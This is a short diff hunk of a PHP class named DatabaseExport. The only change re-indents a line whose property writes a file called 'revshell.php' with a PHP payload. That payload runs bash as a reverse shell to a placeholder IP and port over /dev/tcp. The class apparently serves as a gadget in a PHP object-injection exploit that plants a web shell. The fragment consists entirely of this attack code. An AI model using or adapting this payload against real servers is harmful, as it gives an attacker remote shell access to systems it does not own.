@@ -3,7 +3,7 @@
 class DatabaseExport
 {
         public $user_file = 'revshell.php'; //free
-    public $data = '<?php exec("/bin/bash -c \'bash -i > /dev/tcp/<ip>/<port> 0>&1\'");?>';
+        public $data = '<?php exec("/bin/bash -c \'bash -i > /dev/tcp/<ip>/<port> 0>&1\'");?>';
 
         public function update_db()
         {
